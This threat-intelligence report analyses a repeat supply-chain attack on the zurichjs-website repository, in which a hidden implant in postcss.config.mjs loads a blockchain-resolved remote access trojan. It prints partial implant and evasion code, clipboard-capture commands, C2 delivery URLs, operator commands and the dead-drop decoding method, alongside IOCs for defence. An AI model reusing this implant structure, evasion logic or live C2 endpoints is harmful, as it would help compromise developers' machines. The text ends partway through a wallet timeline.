# ZurichJS Supply-Chain Attack -- SECOND CAMPAIGN (5-3-298)
# DEV#POPPER / PolinRider Reinfection

**TLP: WHITE**
**Report date:** 2026-06-05
**Last updated:** 2026-06-18 (liveness recheck -- see dedicated section)
**Confidence:** High
**Related to:** Previous campaign 5-3-161 (2026-02-19 to 2026-05-04)

---

## Summary

A second malicious payload was injected into `zurich-js/zurichjs-website` on **2026-05-25**, only
**21 days after the first campaign (5-3-161) was remediated on 2026-05-04**. The injection was
committed via the same compromised/sock-puppet GitHub account (`farisaziz12`, ID 53216647) used in
the previous attack.

This time the payload was embedded in `postcss.config.mjs` (instead of `next.config.mjs`), using
the same technique: 2,700+ trailing ASCII space characters hiding the payload on line 10, invisible
in standard diff views.

The campaign was detected and removed within **1 day** (remediation commit 2026-05-26), compared to
74 days for the first campaign -- suggesting the ZurichJS team implemented monitoring after the
first incident.

**Infrastructure overlap with campaign 5-3-161: 100%** -- same C2 IP, same blockchain addresses,
same XOR keys. Only the C2 port and target file changed.

**This campaign represents a major capability escalation.** Full payload chain analysis (Stages 0-4)
reveals the malware is now a full RAT with socket.io WebSocket C2, persistent injection into VS
Code / Cursor / Discord / GitHub Desktop / NPM, remote shell, and clipboard capture -- far beyond
the credential-harvesting-only OmniStealer from campaign 5-3-161. The C2 was updated at
14:31 UTC on 2026-06-05 (day of this analysis), confirming active operation.

---

## Injection Details

| Field | Value |
|-------|-------|
| Repository | zurich-js/zurichjs-website |
| Injection commit | bd6cf2bae2c628b9d6f7f3477669ada1d0c5e2e3 |
| Injection date | 2026-05-25 18:32:10 UTC |
| Commit message | "fix twint" |
| Author account | farisaziz12 (GitHub ID 53216647) -- same as campaign 5-3-161 |
| Infected file | postcss.config.mjs (line 10, after 2,700+ trailing spaces) |
| Remediation commit | 19ef30866396a414d985af5cd02cf821368b680a |
| Remediation date | 2026-05-26 15:46:46 UTC |
| Active window | 21 hours 14 minutes |

### Same-commit distraction: donate.tsx

The injection commit also modified `src/pages/donate.tsx` to add a mobile-responsive TWINT payment
button loading from `https://unpkg.com/@raisenow/paylink-button@2/dist/TwintButton.js`.

**Assessment: LEGITIMATE** -- `@raisenow` is a Swiss fundraising platform providing TWINT payment
integration. This change appears to be genuine UX work by the compromised developer account,
injected alongside the malicious payload to make the commit appear routine.

---

## Full Payload Chain Analysis

The complete 5-stage payload chain was decoded during this analysis. Stages 3 and 4 were retrieved
live from the active C2 infrastructure.

```
Stage 0  postcss.config.mjs (shuffle cipher, seed 36301)
  |
  +-- blockchain dead-drop: TRON TCqf6Z... -> BSC 0x5ab85a... (updated 2026-05-19)
  |
Stage 1  5,369-char JS (XOR key 2[gWfGj;<:-93Z^C)
  |      Sets globals: _t_s=:443, _t_u=:80, _t_1=TA48dct..., _t_2=0x533b2...
  |
Stage 2  1,534-char JS (RrR function-constructor decoder + shuffle cipher seed 1347634)
  |
  +-- blockchain dead-drop: TRON TA48dct... -> BSC 0x23fea4... (updated 2026-06-05 14:31 UTC!)
  |
Stage 3  77,365-char JS (XOR + LZString UTF16 decompression)
  |      Full RAT loader -- injects into apps, installs socket.io, launches C2 connection
  |
  +-- GET http://198.105.127.210:443/0x/js?_V=5-3-298&id=...
  |
Stage 4  69,913-char JS (live from C2, build marker /*RS260605*/)
         Socket.io WebSocket RAT -- full remote shell, file ops, clipboard, eval
```

### Stage 0: postcss.config.mjs Implant

```javascript
global.i='5-3-298';
(function(){
  var _$_913e=(function(r,v){...shuffle cipher, seed 36301...})("uldhbnle%...", 36301);
  // blockchain dead-drop resolver
  // spawns detached node process:
  require('child_process').spawn('node', [
    '-e', "global['_V']='5-3-298';<stage1_payload>"
  ], {detached: true, stdio: 'ignore', windowsHide: true})
})()
```

**Key change from 5-3-161:** Stage 0 now spawns a detached `node -e` subprocess instead of
directly evaling. The subprocess survives PostCSS process exit, persisting independently.

### Stage 0 String Table (seed 36301 -- IDENTICAL to campaign 5-3-161)

```
[50] '2[gWfGj;<:-93Z^C'                                    <- XOR key 1 (SAME)
[51] 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'                  <- TRON wallet 1 (SAME)
[52] '0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519'  <- Aptos 1 (SAME)
[53] 'm6:tTh^D)cBz?NM]'                                    <- XOR key 2 (1 char diff from 5-3-161)
[54] 'TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH'                  <- TRON wallet 2 (SAME)
[55] '0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471'  <- Aptos 2 (SAME)
[40] 'bsc-dataseed.binance.org'                             <- BSC RPC (SAME)
[41] 'bsc-rpc.publicnode.com'                               <- BSC RPC fallback (SAME)
[35] '?.?'                                                  <- calldata delimiter (SAME)
```

### Stage 1 Decode (5,369 chars, XOR key `2[gWfGj;<:-93Z^C`)

Multi-layer obfuscated script. Decoded string tables reveal:

**Layer 2 (base64 atob, shuffle cipher seed 2862089):**
```
'_t_1' -> 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'
'_t_2' -> '0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519'
```

**Layer 3 (shuffle cipher seed 2191935):**
```
'_t_s' -> 'http://198.105.127.210:443'   <- primary C2 (was :27017)
'_t_u' -> 'http://198.105.127.210:80'    <- fallback C2
'_t_1' -> 'TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v'   <- TRON Stage 1b (SAME as 5-3-161)
'_t_2' -> '0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1'
```

### Stage 2 Decode (1,534 chars -- RrR function-constructor decoder)

Stage 2 is itself a blockchain dead-drop resolver, using `global._t_1` and `global._t_2` (set by
Stage 1) to fetch Stage 3 from a separate BSC transaction.

**Stage 2 string table (shuffle cipher seed 1347634):**
Uses identical structure to Stage 0: same TRON/Aptos/BSC API calls, same XOR key `2[gWfGj;<:-93Z^C`.
Fetches from `global._t_1 = TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v`.

**Stage 1b blockchain (TRON TA48dct... wallet):**
```
Latest tx:  2026-06-05 14:31:09 UTC  <- updated SAME DAY as this analysis
BSC hash:   0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f
```

### Stage 3 Decode (77,365 chars -- XOR + LZString)

Decrypted from BSC calldata using XOR key `2[gWfGj;<:-93Z^C`. Contains:
- LZString decompressor (`wHor1tG`) with UTF16-compressed string table (`DugUc2`, 1,716 chars)
- Decompresses to 4,907-char string table containing all capability strings
- Full RAT loader and C2 communication bootstrap

**Stage 3 capabilities (from decompressed string table):**

1. **App persistence injection** -- reads and modifies installed app files to insert the Stage 4
   RAT as a persistent backdoor (survives removal of the original infected repo):
   - **VS Code** (`app-vscode`): `node_modules/@vscode/deviceid/dist/index.js` (all platforms)
   - **Cursor** (`app-cursor`): same `@vscode/deviceid` path (all platforms)
   - **Antigravity IDE** (`app-antigravity`): same `@vscode/deviceid` path (all platforms)
   - **Discord** (`app-discord`): `discord_desktop_core[-1]/discord_desktop_core/index.js`;
     tries both `-1` versioned slot and unversioned slot (all platforms)
   - **GitHub Desktop** (`app-GitHubDesktop`): `resources/app/main.js` (all platforms)
   - **NPM CLI** (`NPM`): `npm/lib/cli.js` located via `npm root -g` (all platforms)
   
   Stage 4 can also inject/remove on demand via `ss_inz:<app>` / `ss_inzx:<app>` operator commands.

2. **socket.io-client installation** -- installs `socket.io-client` and `axios` via npm if not
   present (`npm --prefix "<dir>" install socket.io-client axios`)

3. **Sandbox detection:**
   - CI hostnames: `github-runner`, `buildbot`, `build-`, `sandbox-pool-`, `buildkitsandbox`,
     `cloudchamber`, `(none)`, `microsoft-standard-WSL2`
   - Username: `root`
   - Aborts if detected

4. **Process blocklist** -- Windows-only (`platform.startsWith('win')`). Runs
   `tasklist /FO CSV /NH`, splits each line by comma, strips quotes from the first field to get
   the image name, then skips any name whose first character is not `'O'` (uppercase). For each
   remaining name it computes `MD5(name)` and compares to `9a47bb48b7b8ca41fc138fd3372e8cc0`.
   If matched, execution aborts (return).
   
   Decoded check logic:
   ```javascript
   const lines = execSync('tasklist /FO CSV /NH', {windowsHide:true}).trim().split('\n');
   for (const line of lines) {
     const name = line.split(',')[0].replace(/"/g, '');
     if (name[0] !== 'O') continue;
     if (crypto.createHash('MD5').update(name).digest('hex')
         === '9a47bb48b7b8ca41fc138fd3372e8cc0') return;
   }
   ```
   
   **Target process: UNIDENTIFIED after exhaustive testing.** Only process names starting with
   uppercase `'O'` are checked. 6,000+ candidates tested across all sessions, covering:
   AV/EDR (OfficeScan family, Online Armor OA* suite, OPSWAT, Norman, Outpost, OSSEC/Wazuh,
   Carbon Black Osiris), Korean-market security (AhnLab AOS, ESTsoft, Hauri, INCA nProtect,
   RaonSecure, TouchEn), sandbox/analysis environments (OllyDbg variants, VMware/oVirt guest
   agents, commercial sandbox processes), APM/monitoring agents (Dynatrace OneAgent, SolarWinds
   Orion, Okta Verify), developer tools (Obsidian, OmniSharp, Octopus Deploy, OrbStack),
   offensive tool naming patterns, all 2-character `Oxx.exe` combinations (3,844 names), and
   UTF-16LE/null-terminated/trailing-whitespace encoding variants. None matched.

   Three hypotheses in order of likelihood:
   (a) **Actor-internal tool**: A process running on the actor's own operational/test
       infrastructure -- unknown outside their environment. The separate hostname blocklist
       (`EV-CHQG3L42MMQ`, `EV-4A6OE6M0E2D`) already handles their test machines, but a
       process check would additionally protect against re-infection if the same test machine
       is rebuilt or renamed.
   (b) **Specific sandbox process**: A commercial malware analysis sandbox (Joe Sandbox,
       Hatching Triage, VMRay, ANY.RUN, etc.) may run a guest agent or monitor process
       starting with 'O' that the actor identified during their own testing against sandbox
       infrastructure. These vendors deliberately obfuscate their agent process names,
       making this category hard to enumerate externally.
   (c) **Intentional dead code**: The hash deliberately matches nothing -- designed to waste
       analyst time. Less likely given the structural care taken elsewhere in the malware.

   The MD5 is reproduced here for future researchers:
   `MD5 = 9a47bb48b7b8ca41fc138fd3372e8cc0` (UTF-8 encoded process image name, uppercase O prefix)

5. **C2 connection** -- fetches Stage 4 from `GET /0x/js?_V=<version>&id=<uuid>`, then opens
   socket.io WebSocket to `_t_s` (port 443) or `_t_u` (port 80) fallback

6. **Clipboard capture** -- `powershell -NoProfile -Command "Get-Clipboard"` (Windows),
   `pbpaste` (macOS), `xclip -selection clipboard -o` (Linux)

7. **Build/version markers** embedded in injection stubs:
   `/*C250617A*/`, `/*C250618A*/`, `/*C250619A*/`, `/*C250620A*/` (June 2025)
   `/*C260511A*/`, `/*C260512A*/` (May 2026), `/*RS260605*/` (June 2026)
   These date markers suggest the injection framework has been in development since at least
   June 2025.

**Actor test-machine hostname blocklist (new vs 5-3-161):**
```
EV-CHQG3L42MMQ   (was EV-CHQG3L42M in 5-3-161)
EV-4A6OE6M0E2D   (was EV-4A6OE6M0E in 5-3-161)
```
These are the actor's own development/test machine hostnames. Stage 3 checks
`os.hostname()` against these values and aborts if matched -- a standard
"don't infect your own box" self-exclusion. The slight suffix extension between
campaigns (`M` -> `MMQ`, `E` -> `E2D`) suggests the actor renamed their test
machines between 5-3-161 and 5-3-298, or provisioned new ones.

### Stage 4: Live Payload from C2 (69,913 chars)

Retrieved live from `http://198.105.127.210:443/0x/js?_V=5-3-298&id=test` on 2026-06-05.
Build marker: `/*RS260605*/` (same day as TRON wallet update).

Stage 4 is the full socket.io RAT. Operator commands received over socket.io:

| Command | Description |
|---------|-------------|
| `ss_info` | Dump victim info (version, session, OS, paths, timestamps) |
| `ss_ip` | Fetch IP geolocation via `http://ip-api.com/json` |
| `ss_cb` | Capture clipboard |
| `ss_upf` | Upload file to C2 via POST `/u/f` |
| `ss_upd` | Upload entire directory |
| `ss_dir` | List directory |
| `ss_fcd` | Fast directory listing |
| `ss_stop` | Stop current operation |
| `ss_inz:<app>` | Inject Stage 4 backdoor into named app |
| `ss_inzx:<app>` | Remove injection from app |
| `ss_connect:<url>` | Reconnect to different C2 |
| `ss_eval:<code>` | Remote eval (plaintext) |
| `ss_eval64:<b64>` | Remote eval (base64-encoded) |
| `ss_exit` | Graceful exit |
| `ss_exit_f` | Force exit |
| `cd <path>` | Change working directory |
| `<shell cmd>` | Execute arbitrary shell command |

**Socket.io session confirmed live (2026-06-05):**
```
GET /socket.io/?EIO=4&transport=polling -> HTTP 200
Response: 0{"sid":"X7ZzUS88wIU7cdcOAHQ4","upgrades":["websocket"],
            "pingInterval":25000,"pingTimeout":60000}
```

---

## C2 Infrastructure

### Comparison: Campaign 5-3-161 vs 5-3-298

| Component | Campaign 5-3-161 | Campaign 5-3-298 | Changed? |
|-----------|-----------------|-----------------|----------|
| C2 IP | 198.105.127.210 | 198.105.127.210 | NO |
| C2 port (primary) | 27017 | 443 | YES |
| C2 port (fallback) | -- | 80 | YES |
| C2 framework | EmbedIO/3.5.2 (C#) | Express.js (Node.js) | YES |
| C2 protocol | HTTP REST | Socket.io WebSocket | YES |
| Stage 4 delivery path | /$/boot | /0x/js?_V=...&id=... | YES |
| File upload path | /u/f | /u/f | NO |
| Operator alert path | /verify-human/ | /verify-human/ | NO |
| Port 27017 behavior | Served payloads | nginx decoy -> GitHub | YES |
| ASN | AS149440 Evoxt | AS149440 Evoxt | NO |
| TRON wallet 1 | TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF | same | NO |
| TRON wallet 2 | TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH | same | NO |
| TRON Stage 1b | TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v | same | NO |
| Aptos addr 1 | 0x9d202c... | same | NO |
| XOR key 1 | 2[gWfGj;<:-93Z^C | same | NO |
| BSC RPC | bsc-dataseed.binance.org | same | NO |
| Calldata delimiter | ?.? | same | NO |
| Campaign version | Sec-V: 5-3-161 | Sec-V: 5-3-298 | YES |
| Malware class | Credential stealer | Full RAT + persistence | YES |

### C2 Infrastructure Map

Three IPs confirmed under **AS149440 (Evoxt Sdn. Bhd.)** — actor deliberately uses this
budget VPS provider across all campaigns:

| IP | Location | Role | Status (2026-06-18) |
|----|----------|------|---------------------|
| `198.105.127.210` | London, GB | Primary C2 | **ALIVE** — Stage 4 delivery (port 443) + socket.io C2 + nginx decoy (port 27017) |
| `23.27.202.27` | New York, US | Secondary C2 | **ALIVE** — socket.io C2 only (port 443); Stage 4 delivery returns 404 |
| `136.0.9.8` | — | Former C2 (_V=A campaigns) | **DEAD** — all ports timeout |

**Primary C2 status (per-port, 2026-06-18):**

| Port | 2026-06-05 | 2026-06-18 |
|------|-----------|-----------|
| 443 | ALIVE — Express.js, socket.io | **ALIVE** — same. New SID `517ruIfWJScPRzO8Ac6E` |
| 80 | DOWN | DOWN |
| 27017 | ALIVE — nginx, 302 → GitHub decoy | **ALIVE** — nginx still up, decoy redirect **removed** (now 404) |

**Secondary C2 (`23.27.202.27`) — new finding (2026-06-18):**

Socket.io responds on port 443 (SID `MczMz4eeFJJz-PtyBBPg`, same `pingInterval:25000`/
`pingTimeout:60000` parameters as primary C2), but all payload delivery paths return 404.
This node is functioning as a **WebSocket listener only** — it receives victim connections
but does not serve Stage 4. Two scenarios:

1. **Victim migration**: Victims from _V=A or _V=C campaigns (or victims redirected via
   `ss_connect`) are maintaining persistent WebSocket connections to this secondary node
2. **Load separation**: The actor split payload delivery (primary) from C2 control (secondary)
   to reduce exposure of the delivery server

The node is on a different continent (US vs UK) to the primary, suggesting deliberate
geographic separation.

### Port 27017 Decoy

The nginx server on port 27017 redirects (HTTP 302) to:
`https://github.com/duanegoodner/xiangqigame/raw/refs/heads/main/prototypes/crtp_constructors/gist_crtp_constructors`

Target file: legitimate 35 KB ELF C++ binary (CRTP demo, committed 2024-11-20). Hybrid Analysis
confirmed NOT malware. This is a deliberate analyst misdirection -- the real payloads are on
port 443.

---

## Capability Comparison

| Capability | Campaign 5-3-161 | Campaign 5-3-298 |
|-----------|-----------------|-----------------|
| Credential harvesting | Yes (browsers, wallets, SSH, API keys) | Unknown -- Stage 5 not yet retrieved |
| Persistent app injection | No | **Yes -- VS Code, Cursor, Discord, GitHub Desktop, NPM** |
| Remote shell | No | **Yes -- full interactive shell** |
| Real-time C2 | No | **Yes -- socket.io WebSocket** |
| Clipboard capture | No | **Yes -- all platforms** |
| Remote eval | No | **Yes -- plaintext and base64** |
| File ops | Upload only | **Upload, download, directory listing** |
| Operator commands | None (push-only) | **Full operator console** |
| Self-removal | No | **Yes -- ss_exit_f, injection removal** |

---

## Indicators of Compromise (IOCs)

### Network

```
# All confirmed AS149440 (Evoxt Sdn. Bhd.)
198.105.127.210:443      # Primary C2 -- Stage 4 delivery + socket.io RAT -- ALIVE 2026-06-18
198.105.127.210:80       # C2 fallback -- not responding
198.105.127.210:27017    # nginx/1.28.0 -- was decoy redirect (gone as of 2026-06-18, now 404)
23.27.202.27:443         # Secondary C2 -- socket.io WebSocket listener ONLY -- ALIVE 2026-06-18 (New York)
136.0.9.8                # Former C2 (_V=A campaigns) -- ALL PORTS DEAD as of 2026-06-18

# C2 paths
GET  /0x/js?_V=<version>&id=<uuid>   # Stage 4 delivery
POST /u/f                              # File upload
POST /verify-human/<channel>           # Operator alert
GET  /socket.io/?EIO=4&transport=...   # WebSocket C2
```

Blockchain dead-drops (confirmed active as of 2026-06-08 -- 8 days before this update):
```
api.trongrid.io                        # TRON wallet lookup
fullnode.mainnet.aptoslabs.com         # Aptos fallback
bsc-dataseed.binance.org               # BSC RPC
bsc-rpc.publicnode.com                 # BSC RPC fallback
http://ip-api.com/json                 # IP geolocation (Stage 4)
```

Telegram fallback exfiltration (from eSentire analysis of related campaign):
```
Chat/group IDs: 7699029999 / 7609033774 / -4697384025
```

### File Hashes (SHA-256)

```
# Infection artifact
c1314e72963f6be2aaa0f5d51a34608203b69401eb7e4b2828f5fc7413febc37  postcss.config.mjs.infected

# Decoded analysis artifacts
d017fe6e8e138630575050902acde5a41a4d676f73eace64ecc47d49262e2330  stage1_decrypted.js
c74e11f97168d9f1f3a434248c9d875b0012cca23e90a5940b7bd4a61063172d  stage4_live.js (C2, 2026-06-05; 69,913 bytes)
c45e510e59bc503d06e66a7cf046af5a  stage4_live_20260618.js (C2, 2026-06-18; 68,572 bytes; silently updated, same marker)

# Decoy file on GitHub (NOT malware)
00637b8594f7b866acfbb255b743d8e0092bd26b0e00add4dc4ea0986308881c  stage3_elf.bin (gist_crtp_constructors)
```

### Blockchain IOCs

```
# TRON wallets
TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF   <- Stage 0/1 primary   (26 txs, 2025-11-13 to 2026-05-19, dormant since)
TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH   <- Stage 0/1 fallback  (3 outbound txs, 2025-11-19 to 2026-02-27, dormant since)
TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v   <- Stage 1b            (62 txs, 2025-11-14 to 2026-06-08, STILL ACTIVE)

# Aptos addresses (parallel dead-drop -- BSC hash embedded as 0-APT transfer recipient)
0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519  # Aptos-1 (Stage 0/1, 24 txs, matches W1)
0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471  # Aptos-2 (Stage 0/1 fallback, 3 txs, matches W2)
0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1  # Aptos-3 (Stage 1b, 63 txs, matches W3 -- first tx 2025-11-14)

# BSC transactions (Stage payloads -- most recent per wallet at analysis time)
0x5ab85abe6c67adb94322e5700a36915c38d1db1e604920da8aa4fcb530408af0  <- Stage 0->1 (written 2026-05-19)
0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f  <- Stage 2->3 (written 2026-06-05)
0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968  <- Stage 2->3 (written 2026-06-08, LATEST)
```

**Dead-drop decode method (corrected/verified):** the TRON `raw_data.data` memo field on the most
recent `only_from=true` TransferContract from each wallet is hex-decoded to UTF-8, then **the
resulting string is reversed in full**. This both restores the byte order and flips the trailing
`x0` marker into a leading `0x` prefix, yielding the real BSC tx hash. Verified by cross-checking
against `eth_getTransactionByHash` on `bsc-dataseed.binance.org` -- all 9 most recent Stage 1b
entries (see updated Wallet 3 timeline below) resolve to real transactions with ~140-155KB hex
`input` fields, consistent with encrypted Stage 3 payload size.

---

## Blockchain Operational History

### Dead-Drop Architecture

The actor runs a **dual-chain dead-drop system** using TRON and Aptos in parallel. Both chains
are updated simultaneously for every payload rotation. The malware queries whichever chain responds
first and falls back to the other:

**TRON mechanism (W1/W2: Stage 0/1; W3: Stage 1b):**
- Each wallet's most recent outbound `TransferContract` carries a memo (`raw_data.data`)
- Decode: `hex(raw_data.data)` → UTF-8 string → **reverse entire string** → `0x`-prefixed BSC tx hash
- The trailing `x0` the actor appends becomes a leading `0x` prefix when reversed (null terminator
  doubling as a prefix marker)

**Aptos mechanism (parallel fallback):**
- Each Aptos address makes 0-APT `0x1::aptos_account::transfer` transactions
- The BSC hash IS the recipient address directly — Aptos addresses are 32-byte hex = BSC tx hashes
- **No encoding/decoding needed.** The malware reads `transactions[0].payload.arguments[0]`
- One extra Aptos entry exists that has no TRON counterpart (2026-02-25 18:01,
  `0xdef40965...`), indicating Aptos is used as a **testing ground before committing to TRON**

**BSC payload retrieval:**
- `eth_getTransactionByHash(hash)` → `result.input` hex field → XOR-decrypt with key
  `2[gWfGj;<:-93Z^C` → LZString UTF16 decompress → Stage 3 JS (or Stage 1 JS for W1/W2)
- Calldata separated by delimiter `?.?`

All three TRON wallets and all three Aptos addresses were created and funded on the **same day:
2025-11-13**. This is the actor's infrastructure setup date, approximately **3 months before
campaign 5-3-161 launched** (2026-02-19).

### Wallet 1 (TCqf6Z...) -- Stage 0/1 primary -- full transaction timeline

```
DATE (UTC)            BSC HASH POINTED TO (Stage 1 payload)
------------------------------------------------------------------
2025-11-13 15:03      [no calldata -- wallet funded]
2025-11-14 13:50      0xcf23a3eeea74520bc87d58e6...780067   <- first payload (testing)
2025-11-14 14:01      0x3786a62f3e42bbd93ee8af4f...706ed4   <- 10 min later (rapid iteration)
2025-12-17 11:47      0x2025a199b9f3d6fc93583373...5d23     <- 1 month gap (development)
2026-02-10 14:32      0x3b62da076ee5f14201c15af1...faeb     <- 9 days before 5-3-161 launch
2026-02-10 14:41      0x2cc0e34a0714856a15573e55...6416     <- staging for campaign
2026-02-10 20:47      0xb78eeb8d9e71f712ab9a81df...c752
2026-02-12 13:05      0xc55322b77991da29074cc893...74a
2026-02-25 18:06      0xd99818bcc1d98d44f3de3671...7733     <- BURST: 13 updates in 174 min
2026-02-25 18:08      0xc3a3435dfed2a961dde2cfc0...e86e     <- while 5-3-161 is ACTIVE
2026-02-25 18:10      0x14d210084099694c011d7d0d...47f7e    <- intensive live debugging
2026-02-25 18:12      0x602fde62931699bec9eb05dd...cc18
2026-02-25 18:27      0x1780ea17164d5d6cad4cc762...362c
2026-02-25 18:42      0xa62ba4fa40a51ccef2abc71c...688f
2026-02-25 18:55      0x93d43725b946d8ddfce09bf4...706b
2026-02-25 19:09      0x560415046778e7abd3416af6...c84d
2026-02-25 19:16      0x529caff0aee2d5da44032f2c...cf8e
2026-02-25 19:46      0x88ed44af7612ffd4fc11b538...51e8
2026-02-25 20:57      0x9a81c1a22e3b916bc8b1eedd...8a5b
2026-02-25 20:59      0x39daa01908964927dd9ea62c...dab4
2026-02-25 21:00      0x99e703660c5251135d080a08...c141
2026-03-10 14:57      0x578a8cbe42be19f6f862c753...8d05
2026-03-26 15:10      [no calldata -- wallet refunded]
2026-03-26 15:13      0x3055151b225752885be415c1...49b9
2026-05-19 15:04      0x0fa804035bcf4aa8ad029406...8ba5   <- staged for 5-3-298 (6 days early)
2026-05-19 19:28      [no calldata -- wallet refunded]
```

### Wallet 2 (TFMry...) -- Stage 0/1 fallback -- full outbound timeline (3 txs)

```
DATE (UTC)            BSC HASH POINTED TO
------------------------------------------------------------------
2025-11-19 14:03      0x81b0f775b73d61f4965b46319c8938e0f709616756d5cbae33c397e04dd20c88
2026-02-12 13:29      0xb471a315a573cccf20e81bec363fb6466d783087a7d0a1201b1d6e22c3a26fc5
2026-02-27 02:27      0xbcc976e1c8f3dfd93e146ff424836a9635ab36d991a54675635d7fdf30e60616  <- dormant since
```

### Wallet 3 (TA48dct...) -- Stage 1b -- FULL transaction timeline (62 outbound txs)

Full history queried with `limit=100`. Goes back to infrastructure setup date (2025-11-14),
revealing the complete RAT development and testing phase. See "RAT Development Timeline" section
for payload size analysis.

```
DATE (UTC)            BSC HASH POINTED TO (Stage 3 payload)        STAGE
------------------------------------------------------------------  ---------
2025-11-14 14:03      0x4e0c8d86a755bc1a658619c9f399c3e108150539...  v1 (71,882B) <- first build
2025-11-18 14:02      0x23b3d184652dc2b44fe98df7d7a80fa9c0e189e4...  v2 (71,882B)
2025-11-19 14:29      0x942926ed344800452f42a29234ab9738fac40799...  v3 (72,611B) +729B
2025-12-16 14:48      0x7bae794f0d69814fa5c2ef22fad5b3e93a85c0a6...  v4 (73,207B) +596B
2025-12-17 11:33      0x7bd05d18303047ec317be95022e2673ad75c15a7...  v5 (76,630B) +3,423B *
2025-12-17 11:57      0x3bdb13c77e680c84b45a516a268715a44b1d2000...  v6 (75,721B) -909B rollback
2025-12-19 15:07      0xeb9483e19ef7c4c5185854076c3507c60a3688c9...  v7 (75,721B)
2025-12-22 14:42      0x34b86b239bf5350a82a7f3db53be62f6978c2509...  v8 (76,761B) +1,040B
2026-01-06 14:08      0x76e497cb319cce210c438e5e80e064f68bc7e733...  v9 (80,603B) +3,842B *
2026-01-23 15:35      0x8877f0cc5c1b087d7c721c0d95e9f87034ceda8...  v10 (86,428B) +5,825B *
2026-01-23 15:40      0x3b2341df0302e377eb802b32ad15fdb164a18780...  v11 (86,428B)
2026-01-23 15:49      0xf93022a8be935eed8ac7f824c0ee8aebda9f0142...  v12 (86,428B)
2026-01-24 15:34      0x87ba6c00560762e8a9ed22926413b4c7d031aedd...  v13 (86,428B)
2026-01-30 17:19      0xf434ae77bbc9211b9145e5deb00233c6b3f332d0...  v14 (93,708B) +7,280B *
2026-01-30 17:21      0x3ab55c4d63625d660cf57d952c8038172f33f4d0...  v15 (93,708B)
2026-01-30 17:49      0xb91ab5f9807553663674adcae12a552e5542e7f4...  v16 (93,708B)
2026-02-10 21:09      0x64ae1b9184615e95bcca601d20cd74fc1a42ffea...  v17 (93,072B) pre-campaign
2026-02-10 21:15      0x7eff7a4bca19257b292d5cb05cbf88319f97b4ef...  v18 (93,072B)
2026-02-11 14:14      0x6277f6cfb8218edb6cf46c01c3b65d700a15317b...  v19 (69,880B) -23,192B REWRITE
2026-02-11 14:22      0x21436cb87733ed9b5fc5102b3eb2365d798963a3...  v20 (69,880B)
2026-02-11 14:46      0x5b0681d9468376b8077e7f0bc133026690c3393d...  v21 (69,460B) -420B
2026-02-11 15:05      0x179d1babc52702f1f34f88eeba9d1612fe83db44...  v22 (69,460B)
2026-02-12 13:07      0xa87aa9c74f749eacf692cbf811227e4d6a9aa84c...  v23 (69,460B)
2026-02-25 18:01      0xdef40965748043cb9dc62dfa4e065d2ade10f520...  <- APTOS ONLY (test)
2026-02-25 18:05      0xa42016872f530d00c83ded2f84ade68d08df7a76...  <- APTOS ONLY (test)
2026-02-25 18:07      0xc721b28320b190f5409408823162086731f7f176c...  <- APTOS ONLY (test)
2026-02-25 18:38      0x355fb92970234451ce92067eb8bf95f52f5ab617...  <- APTOS ONLY (test)
2026-02-25 18:54      0xa8dd8e843bdeac3b320052536c993764a1d05949...  <- APTOS ONLY (test)
2026-02-25 18:59      0xeb9810ad56a0960aa0f241cfca29b4da552fdda2...  <- APTOS ONLY (test)
2026-02-25 20:00      0xb01d106f59c977facd88083f969110ac6777be8eb309d53b79b06f96200834c5
2026-02-25 20:39      0x1ce9144ad0859aa48dad2effb966d4123442793889869884cc7b94c59db6998c
2026-02-25 20:41      0x82d1df5e7aeb39824e65963c2465e294fbd042cdddc042f1fdc208683657f9aa
2026-02-25 20:45      0xd97b543dfd90937b9c0a9e9c81580bd0b2029e779a6bb579f4812c6c256c8b30
2026-02-25 21:07      0xbd7ababccb5d98cd99ac954450c3de5022d0acebbaf143ef1b34ea6824366f39
2026-02-25 21:44      0x5da20e486af7c87449e5bef343042c944a6b1b41b3b0e0262b71f737f613ead1   <- same burst day as W1
2026-03-03 13:41      0xa726fdff518e8d8d0bf03d2b23dce347df68a8ce905187154afae7a3766536fd
2026-03-18 14:01      0x28069d5af130eebc8bd27ca98c005a2a32bee1c08ba59e1af216f13b18db349d
2026-05-19 16:13      0x3e87e34caca0383d76db34332813f31e2be88a24602f7b7b0a6bcd4dc0ed9d6e
2026-05-19 17:25      0x66f61c8cf5d6bbfc2b1c0a91890497ca147dce45f6e968d2002ffa5e75211f38
2026-05-19 17:32      0x9140a49c97bfed874ad3d8e3670d1c24c3a6433818d23908e236c6441a324e10   <- staged with W1 for 5-3-298
2026-05-20 15:05      0xd865c32814b1323355cd0925ef5c939737dbdbc2dad272e54dbb96842727fbd6
2026-05-20 15:07      0x126a8942a6058fc7ce883e322059d76b7615094e2d5c115991676cdbc3959695
2026-05-20 15:59      0x815a712af5b51226035493a75551d1379422ef3918ca4998b7d85dfd9dcfd5b7
2026-05-21 12:38      0x571ca79be71260296e9d67fb2bebf5f4d314b9df2b461e2ab9eaece1a484f23c
2026-05-21 12:54      0xceb3b0e24555c59415382d18a18a4839b50ed341e7d1568f8d095df3a4245531
2026-05-21 13:02      0xc43f48f34d6937626370962b155e7e1cca4a76e118df11c2fec57eb8c70624a7
